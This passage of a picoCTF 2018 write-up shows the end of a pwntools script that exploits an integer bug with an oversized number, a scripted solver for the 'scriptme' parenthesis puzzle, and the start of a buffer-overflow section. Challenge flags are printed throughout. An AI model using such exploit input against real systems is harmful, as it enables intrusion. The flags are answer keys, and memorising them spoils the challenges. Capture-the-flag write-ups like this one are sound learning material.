</span></span><span style=display:flex><span>i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Putting </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>$ on </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(<span style=color:#ae81ff>11474836400</span>, spin))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(<span style=color:#ae81ff>11474836400</span>)) <span style=color:#75715e># Put some negative numbers, bug in get_long</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format((spin <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>36</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;You deserve this flag!&#39;</span>)
</span></span><span style=display:flex><span>print r<span style=color:#f92672>.</span>recvall()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>close()
</span></span></code></pre></td></tr></table></div></div><h2 id=scriptme>scriptme<a hidden class=anchor aria-hidden=true href=#scriptme>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-16>16</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/bintest# nc 2018shell2.picoctf.com <span style=color:#ae81ff>61344</span>
</span></span><span style=display:flex><span>Rules:
</span></span><span style=display:flex><span><span style=color:#f92672>()</span> + <span style=color:#f92672>()</span> <span style=color:#f92672>=</span> <span style=color:#f92672>()()</span>                                      <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>combine<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>((()))</span> + <span style=color:#f92672>()</span> <span style=color:#f92672>=</span> <span style=color:#f92672>((())())</span>                              <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>absorb-right<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>()</span> + <span style=color:#f92672>((()))</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(()(()))</span>                              <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>absorb-left<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(())(())</span> + <span style=color:#f92672>()</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(())(()())</span>                          <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>combined-absorb-right<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>()</span> + <span style=color:#f92672>(())(())</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(()())(())</span>                          <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>combined-absorb-left<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(())(())</span> + <span style=color:#f92672>((()))</span> <span style=color:#f92672>=</span> <span style=color:#f92672>((())(())(()))</span>                  <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>absorb-combined-right<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>((()))</span> + <span style=color:#f92672>(())(())</span> <span style=color:#f92672>=</span> <span style=color:#f92672>((())(())(()))</span>                  <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>absorb-combined-left<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>()</span> + <span style=color:#f92672>(())</span> + <span style=color:#f92672>((()))</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(()())</span> + <span style=color:#f92672>((()))</span> <span style=color:#f92672>=</span> <span style=color:#f92672>((()())(()))</span> <span style=color:#f92672>=</span>&gt; <span style=color:#f92672>[</span>left-associative<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Example: 
</span></span><span style=display:flex><span><span style=color:#f92672>(())</span> + <span style=color:#f92672>()</span> <span style=color:#f92672>=</span> <span style=color:#f92672>()</span> + <span style=color:#f92672>(())</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(()())</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Let<span style=color:#960050;background-color:#1e0010>&#39;</span>s start with a warmup.
</span></span><span style=display:flex><span><span style=color:#f92672>(()()())</span> + <span style=color:#f92672>(())</span> <span style=color:#f92672>=</span> ???
</span></span></code></pre></td></tr></table></div></div><p>solve.py</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-32>32</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>depth</span>(s):
</span></span><span style=display:flex><span>    cnt<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>(len(s)<span style=color:#f92672>!=</span><span style=color:#ae81ff>0</span>):
</span></span><span style=display:flex><span>        s<span style=color:#f92672>=</span>s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;()&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        cnt<span style=color:#f92672>+=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> cnt
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>calc</span>(s1,s2):
</span></span><span style=display:flex><span>    d1<span style=color:#f92672>=</span>depth(s1)
</span></span><span style=display:flex><span>    d2<span style=color:#f92672>=</span>depth(s2)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> d1<span style=color:#f92672>==</span>d2:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> s1<span style=color:#f92672>+</span>s2
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> d1<span style=color:#f92672>&lt;</span>d2:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;(</span><span style=color:#e6db74>%s%s</span><span style=color:#e6db74>)&#34;</span><span style=color:#f92672>%</span>(s1,s2[<span style=color:#ae81ff>1</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> d1<span style=color:#f92672>&gt;</span>d2:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;(</span><span style=color:#e6db74>%s%s</span><span style=color:#e6db74>)&#34;</span><span style=color:#f92672>%</span>(s1[<span style=color:#ae81ff>1</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>],s2)
</span></span><span style=display:flex><span>solve <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> x:reduce(calc,x<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34; &#34;</span>,<span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;+&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;2018shell2.picoctf.com&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> <span style=color:#ae81ff>61344</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>=</span>remote(host,port)
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>		lines<span style=color:#f92672>=</span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt;&#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>		print <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join(lines)
</span></span><span style=display:flex><span>		din<span style=color:#f92672>=</span>lines[<span style=color:#f92672>-</span><span style=color:#ae81ff>3</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;=&#39;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>		r<span style=color:#f92672>.</span>sendline(solve(din))
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>		print r<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>close()
</span></span></code></pre></td></tr></table></div></div><p><code>picoCTF{5cr1pt1nG_l1k3_4_pRo_cde4078d}</code></p><h1 id=binary-exploitation>binary exploitation<a hidden class=anchor aria-hidden=true href=#binary-exploitation>#</a></h1><h2 id=buffer-overflow-0>buffer overflow 0<a hidden class=anchor aria-hidden=true href=#buffer-overflow-0>#</a></h2><p><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-41>41</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
